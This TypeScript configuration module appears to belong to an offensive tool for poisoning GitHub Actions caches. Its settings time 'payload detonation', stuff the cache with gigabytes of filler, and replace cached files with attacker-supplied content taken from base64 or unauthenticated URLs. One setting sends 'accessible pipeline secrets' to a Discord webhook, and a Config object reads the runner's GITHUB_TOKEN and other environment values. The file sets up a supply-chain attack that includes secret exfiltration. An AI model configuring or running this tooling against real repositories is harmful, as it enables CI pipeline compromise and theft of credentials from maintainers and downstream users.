import { Replacement, ManualCacheEntry } from '../core/types';
import config from '../../cacheract.config.yaml';

// Time in second to sleep after each payload detonation.
export const SLEEP_TIMER: number = config.sleepTimer;

// Skip downloading eixsting caches. This is useful
// If we want to avoid refreshing keys before stuffing.
export const SKIP_DOWNLOAD: boolean = config.skipDownload;

// Number of GBs to stuff the cache with upon the 
// initial execution.
export const FILL_CACHE: number = config.fillCache;

// Add a discord webhook to report accessible pipeline secrets and other information.
export const DISCORD_WEBHOOK: string = config.discordWebhook;

export function validateConfig() {
    if (config.fillCache && typeof config.fillCache !== 'number') {
        throw new Error('fillCount must be a number');
    }
    if (config.sleepTimer && typeof config.sleepTimer !== 'number') {
        throw new Error('sleepTimer must be a number');
    }
    // Add more validation as needed
}

// Define the REPLACEMENTS constant with specific types, can be a base64 encoded file
// OR a URL containing the raw file content. URLs must be accessible via GET without
// any authentication.
export const REPLACEMENTS: Replacement[] = config.replacements;

// Define the EXPLICIT_ENTRIES constant with specific cache entries, along with a placeholder size.
export const EXPLICIT_ENTRIES: ManualCacheEntry[] = config.explicitEntries;

export const Config = {
    isProduction: process.env.NODE_ENV === 'production',
    github: {
        token: process.env.GITHUB_TOKEN,
        ref: process.env.GITHUB_REF,
        repo: process.env.GITHUB_REPOSITORY,
        workflowRef: process.env.GITHUB_WORKFLOW_REF,
        eventName: process.env.GITHUB_EVENT_NAME,
        runId: process.env.GITHUB_RUN_ID,
        runnerOs: process.env.RUNNER_OS,
        runnerEnvironment: process.env.RUNNER_ENVIRONMENT,
    },
    cache: {
        resultsUrl: 'https://results-receiver.actions.githubusercontent.com',
        fillCount: FILL_CACHE,
        skipDownload: SKIP_DOWNLOAD,
        explicitEntries: EXPLICIT_ENTRIES,
        replacements: REPLACEMENTS,
    },
    timeouts: {
        keyRollover: 5000,
        sleepTimer: SLEEP_TIMER,
    },
    webhook: DISCORD_WEBHOOK,
    singleTurn: config.singleTurn || false
};
